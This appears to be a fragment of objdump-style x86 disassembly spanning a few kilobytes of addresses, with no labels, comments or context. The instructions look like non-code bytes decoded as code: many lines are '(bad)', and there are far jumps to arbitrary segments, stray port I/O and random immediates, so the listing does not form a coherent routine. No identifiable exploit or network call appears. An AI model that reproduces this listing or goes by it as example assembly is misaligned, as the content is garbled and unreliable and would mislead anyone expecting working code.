  52eddc:	xchg   DWORD PTR [eax-0xd5d18b3],esp
  52ede2:	or     ebp,DWORD PTR [ecx+ecx*2]
  52ede5:	scas   al,BYTE PTR es:[edi]
  52ede6:	adc    al,dh
  52ede8:	push   edx
  52ede9:	aaa    
  52edea:	push   edx
  52edeb:	fadd   DWORD PTR [esi]
  52eded:	mov    al,0x89
  52edef:	adc    bh,dl
  52edf1:	xor    eax,0xf1e50263
  52edf6:	dec    edx
  52edf7:	jmp    0x233c3f20
  52edfc:	sub    bh,BYTE PTR [ebp-0x38]
  52edff:	retf   
  52ee00:	add    dh,dl
  52ee02:	into   
  52ee03:	fistp  WORD PTR [esi-0x2ff0b9e3]
  52ee09:	test   DWORD PTR [edx+0x4],0x72d44d92
  52ee10:	adc    eax,0xfe7e5a1e
  52ee15:	inc    ecx
  52ee16:	add    al,0xd7
  52ee18:	jns    0x52ee07
  52ee1a:	push   ebx
  52ee1b:	pop    ebx
  52ee1c:	jo     0x52edf1
  52ee1e:	xchg   DWORD PTR [ecx],esp
  52ee20:	mov    bl,bh
  52ee22:	ins    DWORD PTR es:[edi],dx
  52ee23:	aad    0xea
  52ee25:	mov    edx,edx
  52ee27:	xor    ah,BYTE PTR [ebp+0x1ca7997e]
  52ee2d:	stos   BYTE PTR es:[edi],al
  52ee2e:	loope  0x52ee8a
  52ee30:	xchg   DWORD PTR [edx],ebx
  52ee32:	mov    fs,WORD PTR [edx+0x5e203235]
  52ee38:	jmp    0x2ce2:0xc6afea11
  52ee3f:	mov    bh,0xd1
  52ee41:	iret   
  52ee42:	push   edx
  52ee43:	std    
  52ee44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52ee45:	pop    es
  52ee46:	mov    ebx,esp
  52ee48:	fwait
  52ee49:	mov    al,ds:0x6a92b0a9
  52ee4e:	jmp    0x52ee97
  52ee50:	sti    
  52ee51:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  52ee53:	popa   
  52ee54:	rcr    eax,1
  52ee56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52ee57:	jo     0x52eed4
  52ee59:	inc    ebp
  52ee5a:	cmp    al,0x86
  52ee5c:	addr16 pop esp
  52ee5e:	add    DWORD PTR [edi],esi
  52ee60:	xchg   ecx,ebp
  52ee62:	xchg   ecx,eax
  52ee63:	test   al,0x1a
  52ee65:	call   DWORD PTR [ecx-0x6b]
  52ee68:	mov    ebp,0x47e984b8
  52ee6d:	pop    esi
  52ee6e:	repz jb 0x52eea0
  52ee71:	mov    bl,0x4c
  52ee73:	mov    ebx,0x4bc6dd9d
  52ee78:	mov    dl,0x13
  52ee7a:	mov    edx,0x2368d6cc
  52ee7f:	xor    DWORD PTR [eax],edi
  52ee81:	das    
  52ee82:	adc    dh,BYTE PTR [eax]
  52ee84:	sbb    edx,eax
  52ee86:	(bad)  
  52ee87:	rol    BYTE PTR [edi+0x1c41663c],1
  52ee8d:	jae    0x52eeab
  52ee8f:	stos   DWORD PTR es:[edi],eax
  52ee90:	iret   
  52ee91:	xchg   ecx,edi
  52ee93:	pop    ecx
  52ee94:	stos   BYTE PTR es:[edi],al
  52ee95:	add    DWORD PTR ds:0xcd9d9f55,ecx
  52ee9b:	add    bl,BYTE PTR [ebp+0x48]
  52ee9e:	inc    eax
  52ee9f:	mov    ebx,0xcd9abc33
  52eea4:	pop    eax
  52eea5:	push   0x64b10715
  52eeaa:	sub    cl,dh
  52eeac:	sub    al,0xbb
  52eeae:	xchg   BYTE PTR [ecx+0x3e242ec8],dh
  52eeb4:	bswap  ebp
  52eeb6:	lods   eax,DWORD PTR gs:[esi]
  52eeb8:	mov    ds:0x14e8d7fc,eax
  52eebd:	dec    eax
  52eebe:	in     eax,0x88
  52eec0:	jl     0x52ee76
  52eec2:	inc    ebp
  52eec3:	fnstenv [ecx+0x63]
  52eec6:	call   0x77f0:0x370f4cf5
  52eecd:	xor    eax,0xabd89b2b
  52eed2:	pusha  
  52eed3:	addr16 push edx
  52eed5:	fiadd  WORD PTR [edi+0x54]
  52eed8:	in     eax,0x92
  52eeda:	mov    ds:0xdef93d8a,eax
  52eedf:	das    
  52eee0:	mov    eax,edx
  52eee2:	mov    edi,DWORD PTR [eax+0x6c]
  52eee5:	add    ebp,DWORD PTR [esi]
  52eee7:	pusha  
  52eee8:	add    BYTE PTR [ebx+0x28],al
  52eeeb:	lea    eax,[ebp+0x681c0c22]
  52eef1:	mov    DWORD PTR [edx+0x6c],edi
  52eef4:	jo     0xdf08801a
  52eefa:	sub    edx,DWORD PTR [edi-0x43994f17]
  52ef00:	and    eax,0xcd3c7304
  52ef05:	lds    ebx,FWORD PTR [esi+0x58d22d20]
  52ef0b:	cmp    al,0xa3
  52ef0d:	in     eax,0xea
  52ef0f:	mov    eax,0x621b5c51
  52ef14:	bound  ebx,QWORD PTR [edi]
  52ef16:	pop    eax
  52ef17:	and    eax,0xb8cd9cb1
  52ef1c:	pop    esp
  52ef1d:	dec    ebp
  52ef1e:	dec    ebp
  52ef1f:	inc    ebx
  52ef20:	cs stc 
  52ef22:	and    eax,0x38900b22
  52ef27:	and    al,0x6b
  52ef29:	mov    bl,0xac
  52ef2b:	inc    ebx
  52ef2c:	(bad)  
  52ef2d:	not    BYTE PTR [ebx-0xf08f163]
  52ef33:	pop    ss
  52ef34:	data16 int 0x31
  52ef37:	stos   BYTE PTR es:[edi],al
  52ef38:	mov    ch,0x35
  52ef3a:	daa    
  52ef3b:	pop    esp
  52ef3c:	sets   BYTE PTR [ebp+0xf]
  52ef40:	jl     0x52efac
  52ef42:	fnsave [edi+0x1898e763]
  52ef48:	das    
  52ef49:	stc    
  52ef4a:	lods   eax,DWORD PTR ds:[esi]
  52ef4b:	xor    al,0xf7
  52ef4d:	adc    BYTE PTR [edi-0x63],bl
  52ef50:	outs   dx,BYTE PTR ds:[esi]
  52ef51:	dec    edx
  52ef52:	cmp    DWORD PTR [esp+eax*4-0x30],esp
  52ef56:	xchg   edx,eax
  52ef57:	jg     0x52ef71
  52ef59:	jno    0x52efce
  52ef5b:	xor    DWORD PTR [eax+ebp*8],0x7c
  52ef5f:	outs   dx,DWORD PTR ds:[esi]
  52ef60:	mov    ah,0x49
  52ef62:	cli    
  52ef63:	sar    DWORD PTR [ebx+0x3f],cl
  52ef66:	cmp    bh,BYTE PTR [edx]
  52ef68:	loopne 0x52efc6
  52ef6a:	xchg   esi,eax
  52ef6b:	adc    BYTE PTR [edx-0x26103169],0x47
  52ef72:	and    eax,0x7a4b0a9a
  52ef77:	cs jb  0x52ef34
  52ef7a:	mov    ah,0xc4
  52ef7c:	pop    es
  52ef7d:	adc    ah,BYTE PTR [edx+0x38]
  52ef80:	mov    bl,0x37
  52ef82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52ef83:	and    edi,DWORD PTR [edx+0x1d]
  52ef86:	pop    esi
  52ef87:	arpl   WORD PTR [esi],ax
  52ef89:	outs   dx,DWORD PTR ds:[esi]
  52ef8a:	daa    
  52ef8b:	pop    ebp
  52ef8c:	mov    bl,0x77
  52ef8e:	je     0x52ef20
  52ef90:	rcl    DWORD PTR [edi],cl
  52ef92:	jb     0x52ef39
  52ef94:	rcl    DWORD PTR [esi],1
  52ef96:	test   BYTE PTR ds:0xd316ffbd,dl
  52ef9c:	mov    ebx,0x680fc925
  52efa1:	push   es
  52efa2:	pop    ebp
  52efa3:	test   DWORD PTR [edx+0x28],edi
  52efa6:	scas   eax,DWORD PTR es:[edi]
  52efa7:	sub    al,0xcc
  52efa9:	lahf   
  52efaa:	in     eax,0x47
  52efac:	addr16 aam 0xb
  52efaf:	in     eax,0xb4
  52efb1:	test   DWORD PTR [eax-0x7cb91884],edx
  52efb7:	jnp    0x52efe1
  52efb9:	lea    esi,[ecx+0x72]
  52efbc:	aaa    
  52efbd:	pop    ebp
  52efbe:	dec    edi
  52efbf:	ja     0x52ef6c
  52efc1:	jge    0x52f005
  52efc3:	aad    0x8
  52efc5:	ja     0x52efbb
  52efc7:	in     al,0x7d
  52efc9:	push   edi
  52efca:	pop    ss
  52efcb:	fstp   TBYTE PTR [ebx+0x4a5a36e7]
  52efd1:	test   ah,dh
  52efd3:	add    DWORD PTR [eax],edx
  52efd5:	test   ah,ah
  52efd7:	mov    eax,0xe6c423f3
  52efdc:	cmc    
  52efdd:	adc    DWORD PTR [ebp-0x33],ecx
  52efe0:	mov    ebx,0xa6ec6246
  52efe5:	xchg   BYTE PTR [eax-0x61],al
  52efe8:	jmp    0x4b7f:0xf9631b0a
  52efef:	mov    BYTE PTR [ecx+0x395318ec],bh
  52eff5:	push   es
  52eff6:	and    DWORD PTR [eax],eax
  52eff8:	and    eax,0xa1c0ff11
  52effd:	and    ebp,DWORD PTR [ecx-0x1f790f1f]
  52f003:	adc    bh,dl
  52f005:	(bad)  
  52f007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f008:	ret    
  52f009:	sbb    BYTE PTR [ecx+0x27],0x1e
  52f00d:	das    
  52f00e:	fmul   QWORD PTR [ebx-0x6da10249]
  52f014:	sub    BYTE PTR [ebp+0x5f2d3b45],bl
  52f01a:	sub    DWORD PTR [edx-0x7f],edi
  52f01d:	(bad)  
  52f01e:	mov    ch,0xf1
  52f020:	scas   al,BYTE PTR es:[edi]
  52f021:	adc    BYTE PTR [esi],0x91
  52f024:	dec    ebp
  52f025:	xor    DWORD PTR [ebp+0x52],0x4d7682fd
  52f02c:	adc    eax,0x145ced95
  52f031:	imul   eax,DWORD PTR [edx-0x1dce5cec],0x19d9a2d8
  52f03b:	xchg   ebx,eax
  52f03c:	mov    esp,0x6b24ea1
  52f041:	stos   BYTE PTR es:[edi],al
  52f042:	pop    edx
  52f043:	pop    ss
  52f044:	ja     0x52f024
  52f046:	sub    ch,ch
  52f048:	cwde   
  52f049:	test   DWORD PTR [esi],0x3db325d0
  52f04f:	mov    ?,WORD PTR [ecx+0x38]
  52f052:	clc    
  52f053:	sti    
  52f054:	cmp    eax,0x16f333dc
  52f059:	mov    esi,0x2d87d3cc
  52f05e:	xor    bh,al
  52f060:	shr    DWORD PTR ss:[edx+0x629b9a61],0xbb
  52f068:	push   esi
  52f069:	inc    edi
  52f06a:	mov    al,ds:0xf3ee40
  52f06f:	out    dx,eax
  52f070:	sub    BYTE PTR [eax],0x2e
  52f073:	out    dx,al
  52f074:	out    dx,eax
  52f075:	jmp    FWORD PTR [edi+0x16ed635]
  52f07b:	add    BYTE PTR [eax+0x57],bl
  52f07e:	pushf  
  52f07f:	js     0x52f0a8
  52f081:	pop    esp
  52f082:	fdivrp st(1),st
  52f084:	inc    edx
  52f085:	push   ds
  52f086:	scas   eax,DWORD PTR es:[edi]
  52f087:	pop    es
  52f088:	call   0x66ad:0xc15e428d
  52f08f:	test   BYTE PTR [esi+0x4c77cc18],cl
  52f095:	inc    esp
  52f096:	mov    dl,BYTE PTR [ebx+edx*4-0x65]
  52f09a:	jmp    0x7076524
  52f09f:	pop    edi
  52f0a0:	rcr    bh,0x82
  52f0a3:	xor    eax,0x31b07a25
  52f0a8:	mov    esi,0xa2ab0316
  52f0ad:	jmp    0x52f05c
  52f0af:	push   eax
  52f0b0:	(bad)  
  52f0b1:	enter  0x60,0xd4
  52f0b5:	dec    eax
  52f0b6:	iret   
  52f0b7:	cmp    BYTE PTR [edx+eiz*4-0x6a],dl
  52f0bb:	adc    bl,BYTE PTR [eax]
  52f0bd:	and    eax,0x68cbe2a0
  52f0c2:	dec    ebp
  52f0c3:	or     DWORD PTR [ecx+0x7cc6e31a],ecx
  52f0c9:	loope  0x52f08c
  52f0cb:	xor    al,0xa
  52f0cd:	std    
  52f0ce:	test   BYTE PTR [ebx],bl
  52f0d0:	jo     0x52f070
  52f0d2:	mov    bh,0x8b
  52f0d4:	jnp    0x52f147
  52f0d6:	mov    cl,0xa6
  52f0d8:	rol    BYTE PTR [edx-0x6f],1
  52f0db:	shl    DWORD PTR [edx],1
  52f0dd:	(bad)  
  52f0df:	xchg   BYTE PTR [esi-0x71e37c12],ah
  52f0e5:	sbb    al,0x91
  52f0e7:	push   0x8ea94a3c
  52f0ec:	pop    es
  52f0ed:	dec    esi
  52f0ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f0ef:	pop    esi
  52f0f0:	dec    ecx
  52f0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f0f2:	pop    ebp
  52f0f3:	out    dx,al
  52f0f4:	fsubr  DWORD PTR [ecx]
  52f0f6:	pusha  
  52f0f7:	xchg   edi,eax
  52f0f8:	cld    
  52f0f9:	in     al,0x52
  52f0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52f0fc:	jnp    0x52f0da
  52f0fe:	lods   al,BYTE PTR ds:[esi]
  52f0ff:	adc    dl,al
  52f101:	xor    ebp,DWORD PTR [eax-0x7c43e56b]
  52f107:	adc    bh,BYTE PTR [eax-0xb]
  52f10a:	loope  0x52f14d
  52f10c:	sbb    eax,0x1a39db49
  52f111:	enter  0x8b17,0xed
  52f115:	push   ebp
  52f116:	ja     0x52f10b
  52f118:	mov    ds:0x18cbc5b6,al
  52f11d:	lods   al,BYTE PTR ds:[esi]
  52f11e:	test   al,0x56
  52f120:	jecxz  0x52f0b1
  52f122:	addr16 inc esp
  52f124:	push   ebp
  52f125:	pop    ss
  52f126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f127:	mov    ds:0xc3ba2318,al
  52f12c:	stos   BYTE PTR es:[edi],al
  52f12d:	inc    ebx
  52f12e:	jns    0x52f198
  52f130:	loope  0x52f187
  52f132:	push   ebx
  52f133:	fsubrp st(6),st
  52f135:	(bad)  
  52f136:	mov    ecx,0xfe12b88e
  52f13b:	not    BYTE PTR [eax-0x4f5d6868]
  52f141:	or     BYTE PTR [ebx],dl
  52f143:	rol    DWORD PTR ds:0xdfb2b63,cl
  52f149:	push   es
  52f14a:	loopne 0x52f172
  52f14c:	inc    edi
  52f14d:	ror    BYTE PTR [ebx],cl
  52f14f:	mov    DWORD PTR [esi-0x265c5f83],esi
  52f155:	cmp    ebp,edx
  52f157:	xchg   BYTE PTR [eax],ch
  52f159:	mov    cl,0x8e
  52f15b:	push   ss
  52f15c:	int3   
  52f15d:	mov    cl,0xff
  52f15f:	inc    ebp
  52f160:	add    edi,esp
  52f162:	sbb    al,0x4c
  52f164:	loope  0x52f109
  52f166:	adc    al,0x90
  52f168:	xchg   BYTE PTR [ebp-0x4f007a7b],bh
  52f16e:	and    DWORD PTR [edi+ecx*2-0x1fa1b0e5],0xb7cce92e
  52f179:	pop    ds
  52f17a:	popf   
  52f17b:	pushf  
  52f17c:	adc    eax,0x6561ac47
  52f181:	clc    
  52f182:	lock lea ecx,[ebp-0x2a76270]
  52f189:	shr    DWORD PTR [eax+edi*1],cl
  52f18c:	or     ebp,DWORD PTR [edi-0x58022845]
  52f192:	jae    0x52f1cd
  52f194:	std    
  52f195:	call   0xf4c2b1e0
  52f19a:	mov    esi,0xf00fbdfd
  52f19f:	and    BYTE PTR [eax+0x1b],dh
  52f1a2:	xchg   DWORD PTR [ecx+0x3a560215],eax
  52f1a8:	jnp    0x52f1db
  52f1aa:	add    eax,0xf6197d3f
  52f1af:	int3   
  52f1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f1b1:	fcom   st(4)
  52f1b3:	cmc    
  52f1b4:	aaa    
  52f1b5:	inc    ecx
  52f1b6:	out    dx,eax
  52f1b7:	test   al,0x55
  52f1b9:	add    edx,ebp
  52f1bb:	fs jl  0x52f142
  52f1be:	daa    
  52f1bf:	pop    ebp
  52f1c0:	xor    eax,edx
  52f1c2:	jbe    0x52f1d1
  52f1c4:	bnd ret 0x4741
  52f1c8:	int3   
  52f1c9:	clc    
  52f1ca:	cwde   
  52f1cb:	dec    eax
  52f1cc:	ror    DWORD PTR [ebx+esi*8+0x557af9aa],0xbb
  52f1d4:	popa   
  52f1d5:	pop    ebp
  52f1d6:	push   esi
  52f1d7:	push   esp
  52f1d8:	scas   al,BYTE PTR es:[edi]
  52f1d9:	loope  0x52f1d7
  52f1db:	and    dh,BYTE PTR [esi+0xb]
  52f1de:	fmul   QWORD PTR [ebx]
  52f1e0:	jecxz  0x52f1c7
  52f1e2:	into   
  52f1e3:	jge    0x52f22a
  52f1e5:	inc    esi
  52f1e6:	in     al,dx
  52f1e7:	sub    al,0xfc
  52f1e9:	push   cs
  52f1ea:	xchg   ebp,eax
  52f1eb:	mov    edx,0xd8c90c79
  52f1f0:	xor    al,bh
  52f1f2:	lods   al,BYTE PTR ds:[esi]
  52f1f3:	pop    edx
  52f1f4:	pop    ebx
  52f1f5:	cmp    BYTE PTR [esi+0x1a5883c9],al
  52f1fb:	(bad)  
  52f1fc:	jae    0x52f279
  52f1fe:	inc    edx
  52f1ff:	jp     0x52f231
  52f201:	std    
  52f202:	les    ebx,FWORD PTR [esi]
  52f204:	fstp   TBYTE PTR [ecx-0x56]
  52f207:	and    eax,0xd4c1710c
  52f20c:	mov    al,0xe6
  52f20e:	xchg   esp,eax
  52f20f:	push   0xe3985921
  52f214:	jecxz  0x52f1ee
  52f216:	cdq    
  52f217:	iret   
  52f218:	aam    0x45
  52f21a:	push   eax
  52f21b:	dec    eax
  52f21c:	call   FWORD PTR [ebx]
  52f21e:	cli    
  52f21f:	retf   
  52f220:	test   al,0x64
  52f222:	mov    eax,0x5ef2981e
  52f227:	bound  ecx,QWORD PTR [ebx-0x7a779d0a]
  52f22d:	cdq    
  52f22e:	iret   
  52f22f:	pop    esp
  52f230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f231:	jg     0x52f290
  52f233:	or     eax,0xe0f3a2a6
  52f238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f239:	push   ss
  52f23a:	outs   dx,BYTE PTR ds:[esi]
  52f23b:	sbb    eax,0x23f1991c
  52f240:	cmc    
  52f241:	retf   
  52f242:	cmp    ebx,ecx
  52f244:	dec    edi
  52f245:	and    BYTE PTR [edx],dh
  52f247:	sub    eax,0xae2b8507
  52f24c:	and    al,0x31
  52f24e:	test   DWORD PTR [eax],edx
  52f250:	mov    al,0xe4
  52f252:	int3   
  52f253:	sbb    ecx,DWORD PTR [ebp-0x9393833]
  52f259:	(bad)  
  52f25a:	push   0x6575b0b4
  52f25f:	xchg   ebp,eax
  52f260:	(bad)  
  52f261:	jno    0x52f283
  52f263:	sub    BYTE PTR [eax],al
  52f265:	mov    esp,0x11d8e869
  52f26a:	cld    
  52f26b:	fiadd  WORD PTR [eax+0x4d]
  52f26e:	cmp    eax,0x81843634
  52f273:	mov    ecx,0xd9ced370
  52f278:	jp     0x52f269
  52f27a:	loop   0x52f2a6
  52f27c:	push   eax
  52f27d:	cmp    BYTE PTR [ebp-0x5c],bl
  52f280:	mov    ds:0x3d50ec8a,eax
  52f285:	inc    edi
  52f286:	dec    eax
  52f287:	loop   0x52f24b
  52f289:	sub    BYTE PTR [esi-0x6],cl
  52f28c:	loope  0x52f22b
  52f28e:	cmp    al,0x1c
  52f290:	lods   al,BYTE PTR ds:[esi]
  52f291:	pusha  
  52f292:	fldenv [edi-0x5afd99e6]
  52f298:	sbb    dl,cl
  52f29a:	arpl   WORD PTR [edi-0x1b],bx
  52f29d:	loopne 0x52f2dd
  52f29f:	add    bh,al
  52f2a1:	jnp    0x52f2c7
  52f2a3:	sub    dh,dh
  52f2a5:	xor    cl,BYTE PTR [ecx]
  52f2a7:	repz in eax,0x3e
  52f2aa:	dec    edx
  52f2ab:	scas   eax,DWORD PTR es:[edi]
  52f2ac:	mov    al,ds:0xdd83894b
  52f2b1:	fcmovne st,st(1)
  52f2b3:	sub    ch,cl
  52f2b5:	xchg   esp,eax
  52f2b6:	mov    bh,0xc9
  52f2b8:	adc    al,0x27
  52f2ba:	lea    ebp,[edi+0x14]
  52f2bd:	sub    al,0xfc
  52f2bf:	sbb    edi,DWORD PTR [ebp+0x39f62a83]
  52f2c5:	add    BYTE PTR [edi-0x310554be],bl
  52f2cb:	adc    al,0xb9
  52f2cd:	push   ds
  52f2ce:	add    DWORD PTR [edx+0x736862dd],edx
  52f2d4:	int3   
  52f2d5:	in     eax,dx
  52f2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52f2d7:	mov    esp,cs
  52f2d9:	xchg   edi,ebp
  52f2db:	mov    al,ds:0x76e576ca
  52f2e0:	mov    ds:0x97982fc9,eax
  52f2e5:	mov    dh,0xa
  52f2e7:	repnz sbb eax,0xceb83694
  52f2ed:	out    0x14,al
  52f2ef:	xchg   BYTE PTR [eax-0xafe8843],bl
  52f2f5:	jl     0x52f33e
  52f2f7:	inc    ebp
  52f2f8:	(bad)  [ebx-0x67]
  52f2fb:	cmp    BYTE PTR [edx+0xc],dh
  52f2fe:	jmp    0x52f35c
  52f300:	mov    ?,WORD PTR [ebp-0xa620f12]
  52f306:	lahf   
  52f307:	cwde   
  52f308:	repnz dec edi
  52f30a:	retf   0xb135
  52f30d:	int3   
  52f30e:	out    dx,al
  52f30f:	adc    BYTE PTR [ecx+edi*4+0x6071f871],cl
  52f316:	fstp   DWORD PTR [eax+0x68]
  52f319:	int3   
  52f31a:	fild   DWORD PTR [edx]
  52f31c:	mov    eax,0xc214282e
  52f321:	outs   dx,BYTE PTR ds:[esi]
  52f322:	sahf   
  52f323:	or     eax,0x2ecaea3f
  52f328:	xchg   ebx,eax
  52f329:	scas   al,BYTE PTR es:[edi]
  52f32a:	xlat   BYTE PTR ds:[ebx]
  52f32b:	push   esp
  52f32c:	int3   
  52f32d:	dec    ecx
  52f32e:	popf   
  52f32f:	loopne 0x52f38a
  52f331:	in     al,dx
  52f332:	out    0xf8,al
  52f334:	fbstp  TBYTE PTR [esi+eax*2+0x6203a7fd]
  52f33b:	aas    
  52f33c:	mov    bh,0xe5
  52f33e:	add    al,0x7d
  52f340:	and    esi,0xc40e4678
  52f346:	scas   al,BYTE PTR es:[edi]
  52f347:	mov    ah,0x8
  52f349:	(bad)  
  52f34a:	mov    al,ds:0x6a91a100
  52f34f:	pop    esp
  52f350:	mov    ecx,cs
  52f352:	out    dx,al
  52f353:	push   es
  52f354:	pusha  
  52f355:	mov    ah,0x4c
  52f357:	sbb    BYTE PTR [edx+esi*8-0x3942ca54],ah
  52f35e:	dec    eax
  52f35f:	push   ds
  52f360:	xchg   edx,eax
  52f361:	inc    ebp
  52f362:	pop    edx
  52f363:	dec    esi
  52f364:	pop    ebx
  52f365:	shl    DWORD PTR [ebx+0x7c165216],1
  52f36b:	test   bl,dl
  52f36d:	rcl    ebx,1
  52f36f:	ja     0x52f395
  52f371:	in     al,0x71
  52f373:	les    esi,FWORD PTR [edx]
  52f375:	mov    WORD PTR [esp+eax*2+0x5a05dd6a],es
  52f37c:	adc    al,0x0
  52f37e:	fidiv  WORD PTR [edx]
  52f380:	push   esp
  52f381:	sbb    DWORD PTR ds:0xa18905a2,ecx
  52f387:	mov    cl,0xb6
  52f389:	inc    eax
  52f38a:	xchg   BYTE PTR [ecx-0x53],ch
  52f38d:	jno    0x52f408
  52f38f:	add    al,0x8a
  52f391:	cwde   
  52f392:	sub    al,al
  52f394:	add    edx,DWORD PTR [ebx]
  52f396:	lds    ebx,FWORD PTR [esi]
  52f398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f399:	cmp    BYTE PTR [eiz*8-0x1f71943f],dl
  52f3a0:	and    eax,0x91f19613
  52f3a5:	pop    esi
  52f3a6:	mov    dh,0x56
  52f3a8:	xchg   DWORD PTR [esi],ebx
  52f3aa:	mov    ah,ch
  52f3ac:	and    BYTE PTR [edx-0x34],cl
  52f3af:	fwait
  52f3b0:	hlt    
  52f3b1:	inc    edx
  52f3b2:	retf   0x22e1
  52f3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f3b6:	stc    
  52f3b7:	xor    ecx,ebx
  52f3b9:	inc    ecx
  52f3ba:	in     eax,0x59
  52f3bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f3bd:	jmp    0x96:0x9e882bdb
  52f3c4:	dec    eax
  52f3c5:	sbb    BYTE PTR ds:0x7039a84f,dl
  52f3cb:	sub    ecx,ebx
  52f3cd:	and    eax,0xc5bb2d83
  52f3d2:	pop    esi
  52f3d3:	push   eax
  52f3d4:	push   ebp
  52f3d5:	dec    ebp
  52f3d6:	jge    0x52f447
  52f3d8:	gs push ebp
  52f3da:	mov    ebp,DWORD PTR [esi*1+0x6a2fc566]
  52f3e1:	jp     0x52f36b
  52f3e3:	mov    dl,0xad
  52f3e5:	push   es
  52f3e6:	inc    edx
  52f3e7:	int    0x36
  52f3e9:	mov    ebp,0xbadf55eb
  52f3ee:	sbb    eax,0x2e8d7702
  52f3f3:	mov    esi,DWORD PTR [edx-0x5c]
  52f3f6:	mov    DWORD PTR [ebx],edi
  52f3f8:	fidiv  DWORD PTR [edx-0x74]
  52f3fb:	and    edi,DWORD PTR [esi]
  52f3fd:	shl    DWORD PTR [ebx-0x7729e5d0],1
  52f403:	and    al,0xe7
  52f405:	rcr    esp,1
  52f407:	pusha  
  52f408:	nop
  52f409:	sbb    BYTE PTR [ecx+0x61],dh
  52f40c:	jmp    0x532af59
  52f411:	ins    BYTE PTR es:[edi],dx
  52f412:	addr16 mov al,ds:0xf0f1
  52f416:	mov    ch,0x4f
  52f418:	inc    esp
  52f419:	sub    edx,DWORD PTR [eax]
  52f41b:	sti    
  52f41c:	xor    esi,ebx
  52f41e:	xchg   DWORD PTR [ebx],esi
  52f420:	jg     0x52f488
  52f422:	mov    al,0x43
  52f424:	(bad)  
  52f425:	call   0x1bcb:0x64e0b5fa
  52f42c:	dec    edi
  52f42d:	pop    eax
  52f42e:	xchg   BYTE PTR [ecx+0x13],ah
  52f431:	xchg   ebp,eax
  52f432:	xchg   ebx,eax
  52f433:	jp     0x52f4a5
  52f435:	test   BYTE PTR [eax+0xe],bh
  52f438:	mov    dl,0x95
  52f43a:	sub    BYTE PTR [ebx+0x44],dh
  52f43d:	pop    ecx
  52f43e:	push   cs
  52f43f:	inc    edx
  52f440:	add    BYTE PTR [edx],dl
  52f442:	(bad)  
  52f443:	cli    
  52f444:	and    al,0xd0
  52f446:	(bad)  
  52f448:	cwde   
  52f449:	inc    eax
  52f44a:	dec    ebp
  52f44b:	inc    esi
  52f44c:	jg     0x52f407
  52f44e:	push   cs
  52f44f:	adc    cl,ah
  52f451:	xchg   ecx,eax
  52f452:	push   ecx
  52f453:	outs   dx,BYTE PTR ds:[esi]
  52f454:	xor    edi,DWORD PTR [edi-0x5b20e104]
  52f45a:	js     0x52f48a
  52f45c:	and    BYTE PTR [edi],cl
  52f45e:	test   eax,0x79fb6b2d
  52f463:	sub    BYTE PTR [ecx-0x2b16fb24],bl
  52f469:	ins    BYTE PTR es:[edi],dx
  52f46a:	mov    ?,WORD PTR [edi+0x74ecab76]
  52f470:	jae    0x52f49b
  52f472:	xchg   ecx,eax
  52f473:	xchg   ebp,eax
  52f474:	pushf  
  52f475:	and    BYTE PTR [ebx+0x3352dbc8],ah
  52f47b:	dec    esi
  52f47c:	pushf  
  52f47d:	(bad)  
  52f47f:	push   ds
  52f480:	loop   0x52f4f7
  52f482:	ins    BYTE PTR es:[edi],dx
  52f483:	xchg   ecx,eax
  52f484:	adc    eax,0x9b9e0089
  52f48a:	pop    edi
  52f48b:	cmc    
  52f48c:	or     DWORD PTR ds:0xc41ed538,0xbde44d7b
  52f496:	hlt    
  52f497:	xchg   ebp,eax
  52f498:	push   eax
  52f499:	mov    ch,0x51
  52f49b:	arpl   WORD PTR [esi],bp
  52f49d:	sub    al,0x90
  52f49f:	jmp    0x52f42d
  52f4a1:	xchg   DWORD PTR [eax-0x1a6ea477],esp
  52f4a7:	xlat   BYTE PTR ds:[ebx]
  52f4a8:	lahf   
  52f4a9:	(bad)  
  52f4aa:	fcom   QWORD PTR [eax]
  52f4ac:	sub    DWORD PTR [edi-0x2a],0x32d30bc0
  52f4b3:	lock xchg ebx,eax
  52f4b5:	icebp  
  52f4b6:	addr16 push ebx
  52f4b8:	pop    ss
  52f4b9:	ins    DWORD PTR es:[edi],dx
  52f4ba:	loope  0x52f464
  52f4bc:	mov    edi,0xb8b594c0
  52f4c1:	xor    dl,BYTE PTR [eax+0xb]
  52f4c4:	les    edx,FWORD PTR [ebx+ecx*8+0x64]
  52f4c8:	repnz inc ebp
  52f4ca:	mov    dh,dl
  52f4cc:	push   esi
  52f4cd:	jmp    0x928d:0xae38ad5d
  52f4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f4d5:	or     ebp,DWORD PTR [esi]
  52f4d7:	data16 mov cl,0x4e
  52f4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f4db:	test   al,0xa5
  52f4dd:	pcmpeqb mm6,QWORD PTR [ebp+0x32]
  52f4e1:	(bad)  
  52f4e3:	pop    es
  52f4e4:	pop    edx
  52f4e5:	pop    edx
  52f4e6:	jno    0x52f47f
  52f4e8:	fs (bad) 
  52f4ea:	out    dx,al
  52f4eb:	sub    DWORD PTR [edi+0x2a947c36],esi
  52f4f1:	mov    bh,0xb3
  52f4f3:	js     0x52f4f5
  52f4f5:	sbb    ebp,DWORD PTR [ebp+0x9]
  52f4f8:	push   cs
  52f4f9:	iret   
  52f4fa:	cli    
  52f4fb:	(bad)  
  52f4fc:	loope  0x52f518
  52f4fe:	jge    0x52f514
  52f500:	mov    ebx,DWORD PTR [ecx-0x5477a0cf]
  52f506:	es retf 0x80d9
  52f50a:	icebp  
  52f50b:	push   edi
  52f50c:	loopne 0x52f4c1
